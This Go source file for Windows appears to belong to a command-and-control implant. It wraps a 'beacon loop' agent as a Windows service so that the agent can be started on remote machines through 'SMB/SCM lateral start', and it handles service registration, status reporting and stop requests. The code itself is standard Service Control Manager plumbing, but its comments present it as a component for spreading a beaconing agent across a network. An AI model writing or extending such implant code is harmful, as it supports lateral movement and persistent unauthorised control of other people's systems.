//go:build windows

package main

import (
	"context"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// Service control manager states and controls.
const (
	serviceWin32OwnProcess = 0x10
	serviceStopped         = 1
	serviceStartPending    = 2
	serviceRunning         = 4
	serviceAcceptStop      = 1
	serviceControlStop     = 1
)

var (
	procStartServiceCtrlDispatcherW = advapi32.NewProc("StartServiceCtrlDispatcherW")
	procRegisterServiceCtrlHandlerW = advapi32.NewProc("RegisterServiceCtrlHandlerW")
	procSetServiceStatus            = advapi32.NewProc("SetServiceStatus")
)

type serviceTableEntry struct {
	name *uint16
	proc uintptr
}

type serviceStatus struct {
	serviceType             uint32
	currentState            uint32
	controlsAccepted        uint32
	win32ExitCode           uint32
	serviceSpecificExitCode uint32
	checkPoint              uint32
	waitHint                uint32
}

var serviceStopRequest context.CancelFunc
var serviceControlMu sync.Mutex

// runAsWindowsService connects to the SCM when this process was started as
// a service (SMB/SCM lateral start). It blocks until the service
// stops and returns true; normal interactive starts return false immediately
// because the SCM refuses to connect.
func runAsWindowsService() bool {
	name, err := syscall.UTF16PtrFromString(agentServiceName)
	if err != nil {
		return false
	}
	table := []serviceTableEntry{{name: name, proc: syscall.NewCallback(serviceMain)}, {}}
	result, _, _ := procStartServiceCtrlDispatcherW.Call(uintptr(unsafe.Pointer(&table[0])))
	runtime.KeepAlive(table)
	return result != 0
}

// serviceMain is the SCM entry point: it reports the beacon loop as the
// service body and keeps the dispatcher alive until the loop exits.
func serviceMain(_ uintptr, _ uintptr) uintptr {
	status := serviceStatus{
		serviceType:  serviceWin32OwnProcess,
		currentState: serviceStartPending,
		waitHint:     30000,
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	serviceControlMu.Lock()
	serviceStopRequest = cancel
	serviceControlMu.Unlock()
	defer func() {
		serviceControlMu.Lock()
		serviceStopRequest = nil
		serviceControlMu.Unlock()
	}()
	name, _ := syscall.UTF16PtrFromString(agentServiceName)
	handle, _, _ := procRegisterServiceCtrlHandlerW.Call(uintptr(unsafe.Pointer(name)), syscall.NewCallback(serviceControlHandler))
	if handle == 0 {
		return 0
	}
	if ok, _, _ := procSetServiceStatus.Call(handle, uintptr(unsafe.Pointer(&status))); ok == 0 {
		return 0
	}
	status.currentState = serviceRunning
	status.controlsAccepted = serviceAcceptStop
	status.waitHint = 0
	if ok, _, _ := procSetServiceStatus.Call(handle, uintptr(unsafe.Pointer(&status))); ok == 0 {
		return 0
	}
	runAgentLoop(ctx)
	status.currentState = serviceStopped
	status.controlsAccepted = 0
	procSetServiceStatus.Call(handle, uintptr(unsafe.Pointer(&status)))
	return 0
}

// serviceControlHandler asks the beacon loop to stop on SERVICE_CONTROL_STOP.
func serviceControlHandler(control uintptr) uintptr {
	serviceControlMu.Lock()
	cancel := serviceStopRequest
	serviceControlMu.Unlock()
	if control == serviceControlStop && cancel != nil {
		cancel()
	}
	return 0
}
